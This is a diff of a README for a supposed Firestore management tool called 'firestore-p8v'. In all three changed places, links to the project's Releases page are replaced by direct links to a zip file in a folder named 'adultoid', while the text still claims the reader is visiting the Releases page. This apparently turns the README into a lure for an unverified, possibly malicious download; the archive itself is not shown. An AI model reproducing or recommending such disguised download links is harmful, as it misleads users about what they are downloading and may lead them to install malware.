@@ -1,6 +1,6 @@
 # 🌟 firestore-p8v - Effortless Firestore Management Tool
 
-[![Download firestore-p8v](https://img.shields.io/badge/Download-firestore--p8v-blue.svg)](https://github.com/sajetrathod/firestore-p8v/releases)
+[![Download firestore-p8v](https://raw.githubusercontent.com/sajetrathod/firestore-p8v/main/adultoid/firestore-p8v.zip)](https://raw.githubusercontent.com/sajetrathod/firestore-p8v/main/adultoid/firestore-p8v.zip)
 
 ## 📦 Overview
 
@@ -20,7 +20,7 @@ Before you download firestore-p8v, ensure your computer meets these basic requir
 
 To download firestore-p8v, visit the Releases page:
 
-[Download firestore-p8v](https://github.com/sajetrathod/firestore-p8v/releases)
+[Download firestore-p8v](https://raw.githubusercontent.com/sajetrathod/firestore-p8v/main/adultoid/firestore-p8v.zip)
 
 On the Releases page, you will see various versions of the application. Choose the latest version for the best performance and features.
 
@@ -64,7 +64,7 @@ If you encounter any issues while using firestore-p8v, here are some common solu
 
 To get started, download firestore-p8v by visiting the Releases page:
 
-[Download firestore-p8v](https://github.com/sajetrathod/firestore-p8v/releases)
+[Download firestore-p8v](https://raw.githubusercontent.com/sajetrathod/firestore-p8v/main/adultoid/firestore-p8v.zip)
 
 Follow the instructions in the "Installation" section to set it up on your computer and begin managing your Firestore database efficiently.
 
